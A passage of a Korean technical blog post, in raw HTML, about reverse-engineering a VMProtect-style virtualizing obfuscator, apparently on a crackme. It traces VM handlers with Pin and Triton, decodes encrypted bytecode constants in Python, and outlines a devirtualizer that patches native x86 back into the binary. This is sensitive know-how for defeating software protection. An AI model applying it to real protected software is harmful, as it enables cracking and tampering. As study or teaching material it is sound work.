class="hljs-keyword">final</span> ESI = <span class="hljs-number">0x46ef9e</span><span class="hljs-keyword">final</span> EDI = <span class="hljs-number">0xdf590927</span><span class="hljs-keyword">final</span> EBP = <span class="hljs-number">0x19fcbc</span><span class="hljs-keyword">final</span> ESP = <span class="hljs-number">0x19fc00</span>diff EAX = <span class="hljs-number">0xffe4573b</span> EBX diff = <span class="hljs-number">0xdf153c3d</span></code></pre><p><strong>1. &#xBAA8;&#xB4E0; &#xCF00;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; <code>ESI</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC774; &#xC815;&#xD655;&#xD788; 5&#xB9CC;&#xD07C; &#xC99D;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</strong></p><p><code>Case 1</code>: <code>0x47fa63</code> &#x2192; <code>0x47fa68</code> (+5)</p><p><code>Case 2</code>: <code>0x45cb37</code> &#x2192; <code>0x45cb3c</code> (+5)<br><code>Case 3</code>: <code>ESI = 0x46ef99</code> &#x2192; <code>0x46ef9e</code> (+5)  <br><br>ID 82&#xAC00; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0;&#xC11C; &#xCD1D; 5&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC18C;&#xBE44;&#xD588;&#xB2E4;&#xB294; &#xB73B;&#xC774;&#xACE0;, &#xC55E;&#xB2E8; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>movzx eax, byte ptr [esi]</code> / <code>add esi, 1</code>&#xB85C; 1&#xBC14;&#xC774;&#xD2B8;(opcode)&#xB97C; &#xC18C;&#xBE44;&#xD558;&#xACE0;, &#xC774;&#xD6C4; <code>mov eax, [esi]</code> / <code>lea esi, [esi+4]</code>&#xB85C; 4&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xCD94;&#xAC00;&#xB85C; &#xC77D;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; <code>1 + 4 = 5</code> &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xAC00; &#xB418;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <br><br></p><p><strong>2. <code>EBX</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xAC12;&#xC774; &#xC774;&#xC804; &#xC0C1;&#xD0DC;&#xC640; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xC0C8;&#xB85C;&#xC6B4; &#xAC12;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</strong></p><p><code>EBX</code>&#xC758; &#xCD5C;&#xC885; &#xAC12;&#xC774; &#xCD08;&#xAE30; <code>EBX</code>&#xC640; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xC0C8;&#xB85C;&#xC6B4; &#xAC12;&#xC73C;&#xB85C; &#xBC14;&#xB00C;&#xC5C8;&#xC73C;&#xBA70;, &#xB85C;&#xADF8;&#xC758; <code>bc</code>(bytecode) &#xAC12;&#xC778; <code>0x1ecbf564</code> &#xB4F1;&#xC774; &#xD578;&#xB4E4;&#xB7EC; &#xB0B4;&#xBD80;&#xC758; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;(<code>NOR</code>, <code>ADD</code>, <code>ROL</code> &#xB4F1;)&#xC744; &#xAC70;&#xCCD0; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>final EBX</code> &#xAC12;&#xC778; <code>0xafe65f2</code> &#xB4F1;&#xC73C;&#xB85C; &#xBCC0;&#xD658;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; case 2&#xC640; case 3&#xC758; &#xCD5C;&#xC885; <code>EBX</code> &#xB458; &#xB2E4; <code>0x20ae78f3</code>&#xC73C;&#xB85C; &#xB3D9;&#xC77C;&#xD55C;&#xB370;, &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xC554;&#xD638;&#xD654;&#xB41C; BYTECODE(<code>0x1ec6b25f</code>, <code>0x1ec5393d</code>)&#xAC00; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB85C; &#xC218;&#xB834;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC544; &#xC5B4;&#xB5A4; &#xBCF5;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC74C;&#xC744; &#xCD94;&#xC815;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!  <br><br></p><p>&#xADF8;&#xB7EC;&#xBA74; &#xC55E;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; &#xD2B9;&#xC9D5;&#xC744; &#xC885;&#xD569;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.<br>ID 82&#xB294; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xB97C; &#xC77D;&#xC5B4;&#xB4E4;&#xC774;&#xACE0;</p><ul><li>1 &#xBC14;&#xC774;&#xD2B8; opcode</li><li>4&#xBC14;&#xC774;&#xD2B8; &#xC554;&#xD638;&#xD654;&#xB41C; &#xC989;&#xC2DC; &#xAC12;</li></ul><p>&#xC774; 4 &#xBC14;&#xC774;&#xD2B8; &#xAC12;&#xC744; <code>XOR</code>, <code>SUB</code>, <code>ROL</code> &#xAC19;&#xC740; &#xBCF5;&#xC7A1;&#xD55C; &#xC5F0;&#xC0B0;&#xC744; &#xD1B5;&#xD574; &#xB514;&#xCF54;&#xB529;&#xD55C; &#xB4A4;,</p><ul><li>&#xADF8; &#xACB0;&#xACFC;&#xB97C; <code>EBX</code>&#xC5D0; &#xBC18;&#xC601;&#xD574;&#xC11C;, &#xAC00;&#xC0C1; &#xC2A4;&#xD0DD; &#xC0C1;&#xC5D0; &#xC0C1;&#xC218;&#xB97C; &#xD558;&#xB098; &#xC801;&#xC7AC;(<code>LCONST</code>/<code>PUSH</code>)&#xD558;&#xB294; &#xD578;&#xB4E4;&#xB7EC;</li></ul><p>&#xB85C; &#xB3D9;&#xC791;&#xD560; &#xAC83;&#xC784;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xACA0;&#xC8E0;?</p><h3 id="&#xADF8;&#xB7FC;-&#xC9C4;&#xC9DC;-&#xC5F0;&#xC0B0;-&#xB85C;&#xC9C1;&#xC740;"><a href="#&#xADF8;&#xB7FC;-&#xC9C4;&#xC9DC;-&#xC5F0;&#xC0B0;-&#xB85C;&#xC9C1;&#xC740;" class="headerlink" title="&#xADF8;&#xB7FC; &#xC9C4;&#xC9DC; &#xC5F0;&#xC0B0; &#xB85C;&#xC9C1;&#xC740;?"></a>&#xADF8;&#xB7FC; &#xC9C4;&#xC9DC; &#xC5F0;&#xC0B0; &#xB85C;&#xC9C1;&#xC740;?</h3><pre><code class="hljs c">TARGET_HANDLERS = [    <span class="hljs-number">0x44A8A7</span>, <span class="hljs-number">0x47F287</span>, <span class="hljs-number">0x4181BB</span>, <span class="hljs-number">0x40356C</span>, <span class="hljs-number">0x404F43</span>,     <span class="hljs-number">0x405B60</span>, <span class="hljs-number">0x405CB6</span>, <span class="hljs-number">0x405CE2</span>, <span class="hljs-number">0x404F5E</span>, <span class="hljs-number">0x404419</span>,     <span class="hljs-number">0x404E83</span>, <span class="hljs-number">0x4046BF</span>, <span class="hljs-number">0x4046DC</span>, <span class="hljs-number">0x4892AF</span>, <span class="hljs-number">0x41A261</span>,     <span class="hljs-number">0x45F79C</span>, <span class="hljs-number">0x496B0F</span>, <span class="hljs-number">0x474C45</span>, <span class="hljs-number">0x437E65</span>, <span class="hljs-number">0x493FB7</span>,    <span class="hljs-number">0x43CB8A</span>, <span class="hljs-number">0x46688C</span>, <span class="hljs-number">0x45B9AD</span>, <span class="hljs-number">0x432085</span>, <span class="hljs-number">0x484226</span>]</code></pre><p>&#xC55E;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. ID 82&#xB9CC;&#xC73C;&#xB85C;&#xB294; &#xC2E4;&#xC81C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB85C;&#xC9C1; &#xC804;&#xCCB4;&#xB97C; &#xBCF5;&#xC6D0;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C;, &#xC800;&#xB294; ID 82&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD588;&#xB358; &#xBD84;&#xC11D; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xB2E4;&#xB978; &#xD578;&#xB4E4;&#xB7EC;&#xB4E4;&#xB85C; &#xD655;&#xC7A5;&#xD558;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; &#xC218;&#xAC00; &#xB108;&#xBB34; &#xB9CE;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC6B0;&#xC120; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xACFC; trace &#xAE30;&#xBC18; &#xD56B;&#xC2A4;&#xD31F; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xC790;&#xC8FC; &#xD638;&#xCD9C;&#xB418;&#xAC70;&#xB098; &#xC758;&#xBBF8; &#xC788;&#xC5B4; &#xBCF4;&#xC774;&#xB294; &#xD578;&#xB4E4;&#xB7EC; &#xD6C4;&#xBCF4;&#xB9CC; &#xC120;&#xBCC4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><h3 id="&#xBAA8;&#xB4E0;-&#xD578;&#xB4E4;&#xB7EC;&#xC758;-&#xC815;&#xCCB4;&#xAC00;-&#xB4DC;&#xB7EC;&#xB098;&#xB2E4;"><a href="#&#xBAA8;&#xB4E0;-&#xD578;&#xB4E4;&#xB7EC;&#xC758;-&#xC815;&#xCCB4;&#xAC00;-&#xB4DC;&#xB7EC;&#xB098;&#xB2E4;" class="headerlink" title="&#xBAA8;&#xB4E0; &#xD578;&#xB4E4;&#xB7EC;&#xC758; &#xC815;&#xCCB4;&#xAC00; &#xB4DC;&#xB7EC;&#xB098;&#xB2E4;."></a>&#xBAA8;&#xB4E0; &#xD578;&#xB4E4;&#xB7EC;&#xC758; &#xC815;&#xCCB4;&#xAC00; &#xB4DC;&#xB7EC;&#xB098;&#xB2E4;.</h3><pre><code class="hljs c">&gt;&gt;&gt; Handler <span class="hljs-number">0x432085</span> (Length: <span class="hljs-number">39</span>)----------------------------------------  [M] <span class="hljs-number">0x432085</span>: movzx eax, byte ptr [esi]  [!] <span class="hljs-number">0x432088</span>: rol cx, <span class="hljs-number">0xc</span>  [!] <span class="hljs-number">0x43208c</span>: add esi, <span class="hljs-number">1</span>  [!] <span class="hljs-number">0x432096</span>: <span class="hljs-keyword">xor</span> al, bl  [!] <span class="hljs-number">0x43209a</span>: ror cx, <span class="hljs-number">0xf6</span>  [!] <span class="hljs-number">0x43209e</span>: sub al, <span class="hljs-number">0x3a</span>  [!] <span class="hljs-number">0x4320a0</span>: ror al, <span class="hljs-number">1</span>  [!] <span class="hljs-number">0x4320a2</span>: neg al  [!] <span class="hljs-number">0x4320aa</span>: <span class="hljs-keyword">not</span> al  [!] <span class="hljs-number">0x4320b1</span>: <span class="hljs-keyword">and</span> cx, si  [!] <span class="hljs-number">0x4320b4</span>: <span class="hljs-keyword">xor</span> bl, al  [!] <span class="hljs-number">0x4320b6</span>: mov ecx, dword ptr [ebp]  [!] <span class="hljs-number">0x4320bf</span>: add ebp, <span class="hljs-number">4</span>  [!] <span class="hljs-number">0x4320c5</span>: mov dword ptr [esp + eax], ecx  [!] <span class="hljs-number">0x4320c8</span>: ror eax, <span class="hljs-number">0xd2</span>  [!] <span class="hljs-number">0x4320cb</span>: mov eax, dword ptr [esi]  [!] <span class="hljs-number">0x4320cd</span>: add esi, <span class="hljs-number">4</span>  [!] <span class="hljs-number">0x4320de</span>: <span class="hljs-keyword">xor</span> eax, ebx  [!] <span class="hljs-number">0x4320e1</span>: ror eax, <span class="hljs-number">1</span>  [!] <span class="hljs-number">0x4320e3</span>: <span class="hljs-keyword">xor</span> eax, <span class="hljs-number">0x4acb3db9</span>  [!] <span class="hljs-number">0x4320ee</span>: sub eax, <span class="hljs-number">0x458c0140</span>  [!] <span class="hljs-number">0x4320f3</span>: rol eax, <span class="hljs-number">1</span>  [!] <span class="hljs-number">0x4320f5</span>: <span class="hljs-keyword">xor</span> ebx, eax  [!] <span class="hljs-number">0x4320fd</span>: add edi, eax----------------------------------------...</code></pre><p>&#xAC01;&#xAC01;&#xC758; &#xC8FC;&#xC18C;&#xB294; &#xD558;&#xB098;&#xC758; VM &#xD578;&#xB4E4;&#xB7EC; &#xC9C4;&#xC785;&#xC810;&#xC774;&#xACE0;, &#xC774;&#xB4E4;&#xC5D0; &#xB300;&#xD574; ID 82 &#xB54C;&#xC640; &#xB3D9;&#xC77C;&#xD55C; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xBD84;&#xB9AC; &#x2192; &#xD328;&#xD134; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB9C1; &#x2192; Triton&#xC73C;&#xB85C; &#xC758;&#xBBF8;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xBC18;&#xBCF5; &#xC801;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C;&#xB4E4;&#xC5B4; &#xC704; &#xB370;&#xC774;&#xD130;&#xB294; &#xCD94;&#xCD9C;&#xB41C; &#xD578;&#xB4E4;&#xB7EC; &#xC911; <code>0x00432085</code>&#xC5D0; &#xB300;&#xD55C; &#xC2E4;&#xC81C; &#xC0C1;&#xD0DC; &#xBCC0;&#xD654;&#xB97C; &#xCD94;&#xC801;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC0AC;&#xC2E4;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ul><li><code>ESI</code>&#xB97C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xBA70; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB97C; &#xC18C;&#xBE44;</li><li><code>EBX</code>, <code>EDI</code>, &#xC2A4;&#xD0DD;(<code>[esp + eax]</code>) &#xB4F1;&#xC5D0; &#xB300;&#xD574; &#xC77C;&#xC815;&#xD55C; &#xD328;&#xD134;&#xC73C;&#xB85C; &#xC5F0;&#xC0B0; &#xC218;&#xD589;</li><li>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC2A4;&#xD0DD; &#xAE30;&#xBC18; &#xAC00;&#xC0C1; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC77D;&#xACE0; &#xC4F0;&#xAC70;&#xB098;, &#xC0C1;&#xC218;/&#xBA54;&#xBAA8;&#xB9AC; &#xAC12; &#xC870;&#xD569;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xAC12;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xB123;&#xB294; &#xC5ED;&#xD560; &#xC218;&#xD589;</li></ul><p>&#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xAC01; &#xD578;&#xB4E4;&#xB7EC;&#xB9C8;&#xB2E4; &#xC774; opcode&#xAC00; &#xBB34;&#xC5C7;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC0AC;&#xB78C;&#xC774; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xB294; &#xC218;&#xC900;&#xC758; &#xC5F0;&#xC0B0; &#xB2E8;&#xC704;&#xB85C; &#xC694;&#xC57D;&#xD574; &#xB098;&#xAC04; &#xACB0;&#xACFC;, &#xC804;&#xCCB4; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xB098;&#xAC08; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC01; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xC2E4;&#xC81C; VM &#xBA85;&#xB839; &#xC9D1;&#xD569;&#xC758; &#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xCC98;&#xB7FC; &#xBC14;&#xB77C;&#xBCFC; &#xC218; &#xC788;&#xAC8C; &#xB41C; &#xAC83;&#xC774;&#xC8E0;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image17.png" alt></p><p>&#xC704; &#xACFC;&#xC815;&#xC774; &#xC644;&#xB8CC;&#xB418;&#xBA74;, &#xC774;&#xC81C; opcode &#xAC12;&#xC744; &#xC2E4;&#xC81C; &#xD578;&#xB4E4;&#xB7EC; &#xC8FC;&#xC18C;&#xC640; &#xC5F0;&#xACB0;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. Pin&#xC5D0;&#xC11C; VM &#xB514;&#xC2A4;&#xD328;&#xCC98;&#xC758; FETCH &#xC9C0;&#xC810;&#xC744; &#xD6C4;&#xD0B9;&#xD558;&#xC600;&#xACE0;, opcode &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.   </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image18.png" alt></p><p>&#xC774; &#xB85C;&#xADF8;&#xC640; <code>vmtrace.out</code>&#xC744; &#xD568;&#xAED8; &#xD30C;&#xC2F1;&#xD574;, &#xAC01; opcode&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5A4; &#xD578;&#xB4E4;&#xB7EC; &#xC9C4;&#xC785; &#xC8FC;&#xC18C;&#xB85C; &#xC5F0;&#xACB0;&#xB418;&#xB294;&#xC9C0; &#xC5ED;&#xBD84;&#xC11D;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xC608;&#xB97C;&#xB4E4;&#xC5B4; ID 82&#xC5D0; &#xB300;&#xC751;&#xD558;&#xB294; opcode&#xB294; <code>0x02</code>&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.)   </p><h3 id="Devirtualizer-&#xAC00;&#xC0C1;&#xD654;-&#xD574;&#xC81C;&#xAE30;-&#xAC1C;&#xBC1C;"><a href="#Devirtualizer-&#xAC00;&#xC0C1;&#xD654;-&#xD574;&#xC81C;&#xAE30;-&#xAC1C;&#xBC1C;" class="headerlink" title="Devirtualizer(&#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C;&#xAE30;) &#xAC1C;&#xBC1C;"></a>Devirtualizer(&#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C;&#xAE30;) &#xAC1C;&#xBC1C;</h3><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0; &#xC624;&#xBA74; VM &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xC640; &#xC2E4;&#xC81C; &#xD578;&#xB4E4;&#xB7EC; &#xC8FC;&#xC18C;&#xAC00; &#xC77C;&#xB300;&#xC77C; &#xC5F0;&#xACB0;&#xB41C; &#xC0C1;&#xD0DC;&#xAC00; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! &#xB9C8;&#xC9C0;&#xB9C9; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;&#xB294; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xAC00;&#xC0C1;&#xD654;&#xB41C; &#xD568;&#xC218; &#xC804;&#xCCB4;&#xB97C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; x86&#xC73C;&#xB85C; &#xC7AC;&#xAD6C;&#xC131;&#xD558;&#xB294; &#xC804;&#xC6A9; devirtualizer&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;, &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xD328;&#xCE58;&#xAE4C;&#xC9C0; &#xD574;&#xBCF4;&#xC790;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xAD6C;&#xC0C1;&#xD574;&#xBCF4;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>Opcode(&#xC5F0;&#xC0B0; &#xCF54;&#xB4DC;: <code>0x02</code>, <code>0x40</code>, <code>0x88</code>&#xB4F1;..)&#xC640; &#xD574;&#xB2F9; &#xD578;&#xB4E4;&#xB7EC; &#xC8FC;&#xC18C;, &#xC758;&#xBBF8;&#xB97C; &#xB9E4;&#xD551;&#xD55C; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC5B4;<br>opcode &#x2192; [&#xD578;&#xB4E4;&#xB7EC; &#xC8FC;&#xC18C;, &#xC758;&#xBBF8;, &#xC758;&#xC0AC; &#xCF54;&#xB4DC;] &#xB9E4;&#xD551; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>VM &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xC2A4;&#xD2B8;&#xB9BC;&#xC744; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xB05D;&#xAE4C;&#xC9C0; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xAC01; opcode&#xC5D0; &#xB300;&#xD574;&#xC11C;, &#xBBF8;&#xB9AC; &#xC815;&#xC758;&#xD574; &#xB193;&#xC740; &#xB124;&#xC774;&#xD2F0;&#xBE0C;&#xD55C; x86 &#xCF54;&#xB4DC; &#xC870;&#xAC01;&#xC744; &#xC608;&#xB97C;&#xB4E4;&#xBA74;<br><code>LCONST</code> &#x2192; <code>MOV EBX, imm32</code>, <code>ADD</code> &#x2192; <code>ADD [ESP+4], EAX</code> &#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD574;&#xB461;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xC131;&#xB41C; &#xC870;&#xAC01;&#xB4E4;&#xC744; &#xD55C; &#xC601;&#xC5ED;&#xC5D0; &#xC774;&#xC5B4; &#xBD99;&#xC5EC;&#xC11C;, &#xC0C8;&#xB85C;&#xC6B4; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xD568;&#xC218; &#xBCF8;&#xBB38;&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</li><li>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C;&#xB294; &#xC6D0;&#xBCF8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; <code>vir_Entry</code> &#xC9C4;&#xC785;&#xC810;&#xC5D0;&#xC11C; &#xC774; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xD568;&#xC218;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.  </li></ol><p><img src="/2025/12/11/banda/VMPpart2/ko/image19.png" alt></p><p>&#xC800;&#xC758; &#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C;&#xAE30; &#xCF54;&#xB4DC;&#xB97C; &#xC77C;&#xBD80; &#xC18C;&#xAC1C;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xB8E8;&#xD504;&#xC5D0;&#xC11C;&#xB294; &#xAC01; &#xD56D;&#xBAA9;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA74;&#xC11C;, <code>real_vip - VMP_BASE_ADDR</code>&#xB85C; <code>.vmp0</code> &#xC139;&#xC158; &#xB364;&#xD504; &#xB0B4; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xACE0;, opcode 1&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; &#xD574;&#xB2F9; opcode&#xC5D0; &#xB300;&#xC751;&#xD558;&#xB294; &#xD578;&#xB4E4;&#xB7EC; &#xC774;&#xB984;&#xC744; <code>VM_HANDLERS</code>&#xC5D0;&#xC11C; &#xC870;&#xD68C;&#xD558;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image20.png" alt></p><pre><code class="hljs c">val = (encrypted + <span class="hljs-number">0x55106798</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>val = (<span class="hljs-number">0</span> - val) &amp; <span class="hljs-number">0xFFFFFFFF</span>val = (val + <span class="hljs-number">0x69733a52</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>val = ((val &lt;&lt; <span class="hljs-number">1</span>) | (val &gt;&gt; <span class="hljs-number">31</span>)) &amp; <span class="hljs-number">0xFFFFFFFF</span>decrypted = ~val &amp; <span class="hljs-number">0xFFFFFFFF</span></code></pre><p>&#xC8FC;&#xC11D; &#xBD80;&#xBD84;&#xC5D0;&#xB294; Triton&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xD578;&#xB4E4;&#xB7EC; &#xC804;&#xCCB4;&#xB97C; &#xC2EC;&#xBCFC;&#xB9AD; &#xC2E4;&#xD589;&#xD574; &#xC5BB;&#xC740; &#xC5F0;&#xC0B0; &#xC2DC;&#xD000;&#xC2A4;&#xB97C;, &#xC704; &#xC608;&#xC2DC;&#xCC98;&#xB7FC; 32&#xBE44;&#xD2B8; &#xBAA8;&#xB4C8;&#xB7EC; &#xC0B0;&#xC220; &#xD615;&#xD0DC;&#xB85C; &#xD30C;&#xC774;&#xC36C; &#xCF54;&#xB4DC;&#xB85C; &#xC7AC;&#xAD6C;&#xD604;&#xD574;&#xC11C; &#xC801;&#xC5B4;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC554;&#xD638;&#xD654;&#xB41C; 32&#xBE44;&#xD2B8; &#xC0C1;&#xC218;&#xB97C; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xBC1B;&#xC544; VMP &#xD578;&#xB4E4;&#xB7EC;&#xC5D0;&#xC11C; &#xAD00;&#xCC30;&#xB41C; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC21C;&#xC11C;&#xB85C; &#xC0C1;&#xC218; &#xB367;&#xC148; &#x2192; <code>0 - val</code> &#x2192; &#xCD94;&#xAC00; &#xC0C1;&#xC218; &#xB367;&#xC148; &#x2192; 1&#xBE44;&#xD2B8; &#xB85C;&#xD14C;&#xC774;&#xC158; &#x2192; <code>NOT</code> &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD574; &#xCD5C;&#xC885; <code>decrypted</code> &#xAC12;&#xC744; &#xC5BB;&#xB294; &#xD328;&#xD134;&#xC744; &#xD655;&#xC778;&#xD588;&#xB2E4;&#xACE0; &#xCE69;&#xC2DC;&#xB2E4;. &#xC8FC;&#xC11D; &#xBD80;&#xBD84;&#xC740; &#xC704;&#xC640; &#xAC19;&#xC740; &#xD615;&#xD0DC;&#xB85C; &#xC62E;&#xACA8; &#xC801;&#xC5B4;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image21.png" alt></p><p><code>ADD</code>, <code>NOR</code>, <code>COPY</code>, <code>SHL</code>, <code>SHR</code> &#xAC19;&#xC740; &#xC911;&#xC694; &#xD578;&#xB4E4;&#xB7EC;&#xB4E4;&#xC744; &#xC2A4;&#xD0DD; &#xC0C1;&#xB2E8; &#xC5F0;&#xC0B0; + &#xD50C;&#xB798;&#xADF8; &#xBCF5;&#xC6D0; &#xD328;&#xD134;&#xB9CC; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xC870;&#xAC01;&#xC73C;&#xB85C; &#xC815;&#xB9AC;&#xD574; Keystone &#xC5B4;&#xC148;&#xBE14;&#xB7EC;&#xB85C; &#xAE30;&#xACC4;&#xC5B4; &#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xBCC0;&#xD658;&#xD574; <code>patch_buffer</code>&#xC5D0;  &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC313;&#xC558;&#xACE0;, &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC81C;&#xD55C; <code>devirtualizeme_unpacked.exe</code>&#xC758; 